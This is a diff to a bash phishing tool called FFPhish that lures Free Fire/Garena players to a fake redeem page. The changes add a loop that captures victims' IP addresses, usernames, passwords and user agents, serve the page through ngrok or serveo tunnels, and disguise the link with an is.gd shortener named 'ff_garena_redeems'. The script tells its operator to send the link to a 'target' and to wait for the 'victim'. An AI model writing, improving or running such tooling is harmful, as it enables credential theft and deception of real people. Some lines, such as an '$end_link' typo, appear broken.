@@ -5,7 +5,7 @@
 
 
 
-#trap 'printf "\n";stop1;exit 1' 2
+trap 'printf "\n";stop1;exit 1' 2
 
 #server = "FF"
 
@@ -23,7 +23,7 @@ menu() {
 
 
 printf "\e[1;91m  Instructions:  \n[1] You must have install php, curl, lynx and ngrok or serveo.net \n[2] If not then this script can not generate the links. \n[3] Ngrok or Serveo must be placed in the same folder in which freeire.sh is exists.\n\e[0m \n"
-read -p $'\e[1;93m[\e[1;92m*\e[1;93m]\e[1;92m Start the server (Y/n): \e[0m' option
+read -p $'\e[1;93m[\e[1;92m*\e[1;93m]\e[1;92m Start the Phishing (Y/n): \e[0m' option
 
 
 if [[ $option == 'n' || $option == 'N' ]]; then
@@ -64,12 +64,12 @@ exit 1
 
 banner() {
 
-printf "\e[1;92m ███████╗███████╗    ██████╗ ██╗███████╗██╗  ██╗ \e[0m\n"
-printf "\e[1;92m ██╔════╝██╔════╝    ██╔══██╗██║██╔════╝██║  ██║ \e[0m\n"
-printf "\e[1;92m █████╗  █████╗      ██████╔╝██║███████╗███████║ \e[0m\n"
-printf "\e[1;92m ██╔══╝  ██╔══╝      ██╔═══╝ ██║╚════██║██╔══██║ \e[0m\n"
-printf "\e[1;92m ██║     ██║         ██║     ██║███████║██║  ██║ \e[0m\n"
-printf "\e[1;92m ╚═╝     ╚═╝         ╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝ \e[0m\n"
+printf "\e[1;92m     ███████╗███████╗    ██████╗ ██╗  ██╗██╗███████╗ \e[0m\n"
+printf "\e[1;92m     ██╔════╝██╔════╝    ██╔══██╗██║  ██║██║██╔════╝ \e[0m\n"
+printf "\e[1;92m     █████╗  █████╗      ██████╔╝███████║██║███████╗ \e[0m\n"
+printf "\e[1;92m     ██╔══╝  ██╔══╝      ██╔═══╝ ██╔══██║██║╚════██║ \e[0m\n"
+printf "\e[1;92m     ██║     ██║         ██║     ██║  ██║██║███████║ \e[0m\n"
+printf "\e[1;92m     ╚═╝     ╚═╝         ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝ \e[0m\n"
 printf "\n"
 printf "\e[1;93m       .:.:.\e[0m\e[1;77m Phishing Tool coded by: @Uni-Creator \e[0m\e[1;93m.:.:.\e[0m\n"
 printf "\n"
@@ -87,8 +87,12 @@ printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Agent:\e[0m\e[1;77m %s\n\e[0m" $agent
 cat $server/usernames.txt >> $server/saved.usernames.txt
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.usernames.txt\e[0m\n" $server &
-sleep 40
-stop1
+#sleep 0
+#stop1
+rm -rf $server/usernames.txt
+rm -rf $server/ip.txt
+cd ..
+checkfound
 
 }
 
@@ -109,6 +113,7 @@ done
 }
 
 catch_ip() {
+while [ true ]; do
 touch $server/saved.usernames.txt
 ip=$(grep -a 'IP:' $server/ip.txt | cut -d " " -f2 | tr -d '\r')
 #IFS=$'\n'
@@ -191,6 +196,8 @@ printf "\n"
 rm -rf iptracker.log
 
 getcredentials
+
+done
 }
 
 ##
@@ -203,13 +210,16 @@ command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not instal
 if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R ff_garena_redeems:80:127.0.0.1:'$port' serveo.net 2> /dev/null > sendlink ' &
 printf "\n"
 sleep 5 # &
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 printf "\n"
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s \n' $send_link
-send_ip=$(curl -s -N 'http://is.gd/create.php?format=simple&url=$send_link&shorturl=ff_garena_redeems' | grep -o "https://is.gd/ff_garena_redeems")
+send_link2=$"http://is.gd/create.php?format=simple&url=$end_link"
+#echo $link2
+
+send_ip=$(lynx --dump $send_link2)
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using is.gd (Shortener):\e[0m\e[1;77m %s \n' $send_ip
 printf "\n"
 checkfound
@@ -294,24 +304,26 @@ printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
 cd FFPhish/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
 sleep 2
 
+#cd ..
+#cd ..
+#cd $HOME
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
-cd $HOME && ./ngrok http $port > /dev/null 2>&1  &
+./ngrok http $port  > /dev/null 2>&1 &
 sleep 5
-cd FFPhish
+
+#cd FFPhish
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Target: %s\e[0m\e[1;77m %s\e[0m\n" $link
 
-link2=$'https://is.gd/create.php?format=simple&url=$link&shorturl=ff_garena_redeems'
+link2=$"http://is.gd/create.php?format=simple&url=$link"
+#echo $link2
 
-send_ip=$(lynx --dump '$link2')
-#send_ip=$'https://is.gd/ff_garena_redeems'
+send_ip=$(lynx --dump $link2)
 
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using shortenurl (is.gd):\e[0m\e[1;70m %s \n' $send_ip
 printf "\n"
 
-#termux-clipboard-set $link
-#termux-clipboard-set $send_ip
 checkfound
 }
 
@@ -342,6 +354,7 @@ fi
 }
 checkfound() {
 
+cd FFPhish
 printf "\n"
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim open the link ...\e[0m\n"
 while [ true ]; do
